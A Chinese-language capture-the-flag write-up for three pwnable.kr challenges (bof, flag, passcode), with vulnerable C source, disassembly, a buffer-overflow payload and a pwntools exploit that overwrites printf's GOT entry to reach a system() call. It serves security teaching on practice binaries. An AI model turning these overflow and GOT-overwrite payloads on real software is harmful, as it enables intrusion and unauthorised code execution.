# 关于pwnable.kr的几道简单题

## 1.bof

源码

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

gets存在溢出漏洞

我们输入的字符串时把key覆盖为0xcafebabe，就会getshell

```
-0000002C s               db ?
-0000002B                 db ? ; undefined
。。。。。。。。。。。。。。。。。。。。
-0000000D                 db ? ; undefined
-0000000C var_C           dd ?
-00000008                 db ? ; undefined
。。。。。。。。。。。。。。。。。。。。。
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 arg_0           dd ?
```

程序是32位的，agr_0则是key的位置

payload = 'a' * 52 + p32(0xcafebabe)

## 2.flag

感觉是逆向的题

checksec 一下 发现 是upx压缩，linux解压  upx -d 

打开ida，看到flag

```
.text:0000000000401180                 mov     [rbp+dest], rax
.text:0000000000401184                 mov     rdx, cs:flag
.text:000000000040118B                 mov     rax, [rbp+dest]
```

```
.data:00000000006C2070 flag            dq offset aUpxSoundsLikeA
.data:00000000006C2070                                         ; DATA XREF: main+20↑r
.data:00000000006C2070                                         ; "UPX...? sounds like a delivery service "...
.data:00000000006C2078                 align 20h
```

```
.rodata:0000000000496628 aUpxSoundsLikeA db 'UPX...? sounds like a delivery service :)',0
.rodata:0000000000496628                                         ; DATA XREF: .data:flag↓o
```

## 3.passcode

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);				//漏洞所在，passcode1没有加取地址符号
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);			//漏洞所在

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);		//
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

scanf函数，没有加取地址符，那么会把passcode1和passcode2的值作为输入的地址

由于welcome 和 login是连续调用，所以他们的栈底是相同的

objdump -d passcode   看一下反汇编代码

```
passcode:     file format elf32-i386


08048564 <login>:
 8048564:	55                   	push   %ebp
 8048565:	89 e5                	mov    %esp,%ebp
 8048567:	83 ec 28             	sub    $0x28,%esp
 804856a:	b8 70 87 04 08       	mov    $0x8048770,%eax
 804856f:	89 04 24             	mov    %eax,(%esp)
 8048572:	e8 a9 fe ff ff       	call   8048420 <printf@plt>
 8048577:	b8 83 87 04 08       	mov    $0x8048783,%eax
 804857c:	8b 55 f0             	mov    -0x10(%ebp),%edx
 804857f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048583:	89 04 24             	mov    %eax,(%esp)
 8048586:	e8 15 ff ff ff       	call   80484a0 <__isoc99_scanf@plt>
 804858b:	a1 2c a0 04 08       	mov    0x804a02c,%eax
 8048590:	89 04 24             	mov    %eax,(%esp)
 8048593:	e8 98 fe ff ff       	call   8048430 <fflush@plt>
 8048598:	b8 86 87 04 08       	mov    $0x8048786,%eax
 804859d:	89 04 24             	mov    %eax,(%esp)
 80485a0:	e8 7b fe ff ff       	call   8048420 <printf@plt>
 80485a5:	b8 83 87 04 08       	mov    $0x8048783,%eax
 80485aa:	8b 55 f4             	mov    -0xc(%ebp),%edx
 80485ad:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485b1:	89 04 24             	mov    %eax,(%esp)
 80485b4:	e8 e7 fe ff ff       	call   80484a0 <__isoc99_scanf@plt>
 80485b9:	c7 04 24 99 87 04 08 	movl   $0x8048799,(%esp)
 80485c0:	e8 8b fe ff ff       	call   8048450 <puts@plt>
 80485c5:	81 7d f0 e6 28 05 00 	cmpl   $0x528e6,-0x10(%ebp)
 80485cc:	75 23                	jne    80485f1 <login+0x8d>
 80485ce:	81 7d f4 c9 07 cc 00 	cmpl   $0xcc07c9,-0xc(%ebp)
 80485d5:	75 1a                	jne    80485f1 <login+0x8d>
 80485d7:	c7 04 24 a5 87 04 08 	movl   $0x80487a5,(%esp)
 80485de:	e8 6d fe ff ff       	call   8048450 <puts@plt>
 80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)
 80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
 80485ef:	c9                   	leave  
 80485f0:	c3                   	ret    
 80485f1:	c7 04 24 bd 87 04 08 	movl   $0x80487bd,(%esp)
 80485f8:	e8 53 fe ff ff       	call   8048450 <puts@plt>
 80485fd:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048604:	e8 77 fe ff ff       	call   8048480 <exit@plt>

08048609 <welcome>:
 8048609:	55                   	push   %ebp
 804860a:	89 e5                	mov    %esp,%ebp
 804860c:	81 ec 88 00 00 00    	sub    $0x88,%esp
 8048612:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048618:	89 45 f4             	mov    %eax,-0xc(%ebp)
 804861b:	31 c0                	xor    %eax,%eax
 804861d:	b8 cb 87 04 08       	mov    $0x80487cb,%eax
 8048622:	89 04 24             	mov    %eax,(%esp)
 8048625:	e8 f6 fd ff ff       	call   8048420 <printf@plt>
 804862a:	b8 dd 87 04 08       	mov    $0x80487dd,%eax
 804862f:	8d 55 90             	lea    -0x70(%ebp),%edx
 8048632:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048636:	89 04 24             	mov    %eax,(%esp)
 8048639:	e8 62 fe ff ff       	call   80484a0 <__isoc99_scanf@plt>
 804863e:	b8 e3 87 04 08       	mov    $0x80487e3,%eax
 8048643:	8d 55 90             	lea    -0x70(%ebp),%edx
 8048646:	89 54 24 04          	mov    %edx,0x4(%esp)
 804864a:	89 04 24             	mov    %eax,(%esp)
 804864d:	e8 ce fd ff ff       	call   8048420 <printf@plt>
 8048652:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048655:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 804865c:	74 05                	je     8048663 <welcome+0x5a>
 804865e:	e8 dd fd ff ff       	call   8048440 <__stack_chk_fail@plt>
 8048663:	c9                   	leave  
 8048664:	c3                   	ret    

08048665 <main>:
 8048665:	55                   	push   %ebp
 8048666:	89 e5                	mov    %esp,%ebp
 8048668:	83 e4 f0             	and    $0xfffffff0,%esp
 804866b:	83 ec 10             	sub    $0x10,%esp
 804866e:	c7 04 24 f0 87 04 08 	movl   $0x80487f0,(%esp)
 8048675:	e8 d6 fd ff ff       	call   8048450 <puts@plt>
 804867a:	e8 8a ff ff ff       	call   8048609 <welcome>
 804867f:	e8 e0 fe ff ff       	call   8048564 <login>
 8048684:	c7 04 24 18 88 04 08 	movl   $0x8048818,(%esp)
 804868b:	e8 c0 fd ff ff       	call   8048450 <puts@plt>
 8048690:	b8 00 00 00 00       	mov    $0x0,%eax
 8048695:	c9                   	leave  
 8048696:	c3                   	ret    
 8048697:	90                   	nop
 8048698:	90                   	nop
 8048699:	90                   	nop
 804869a:	90                   	nop
 804869b:	90                   	nop
 804869c:	90                   	nop
 804869d:	90                   	nop
 804869e:	90                   	nop
 804869f:	90                   	nop

```

看到name的地址在ebp-0x70, 而passcode1的地址在ebp-0x10, 0x70 == 112, 0x10 == 16

所以0x70-0x10 == 0x60 == 96,所以我们可以看到name的最后四个字节就是passcode1的值，所以我们可以利用welcome来改变passcode1的值，

因为程序开启了栈溢出保护，所以我们不能再继续增加name的输入来改变passcode2的值

所以 我们想到了改写got表的方法，把passcode1的内容改为print_got的地址，然后把system('/bin/sh')的地址写进去

我们用 objdump -R passcode  输出函数地址

```
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0        ////////////--------
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7

```

```
80485de:	e8 6d fe ff ff       	call   8048450 <puts@plt>
 80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)	------system('/bin/sh')地址
 80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
```

0x80485e3 =  134514147

exp：

```python
>>> from pwn import *
>>> r=process('./passcode')
[x] Starting local process './passcode'
[+] Starting local process './passcode': Done
>>> printf_addr = 0x804a000
>>> sys_addr = 134514147
>>> payload = 'a' * 96 + p32(printf_addr) + '\n' + str(sys_addr) + '\n'
>>> r.sendline(payload)
>>> r.recvline()
[*] Process './passcode' stopped with exit code 0
"Toddler's Secure Login System 1.0 beta.\n"
>>> r.recvline()
'enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\n'
>>> r.recvline()
'Sorry mom.. I got confused about scanf usage :(\n'
```

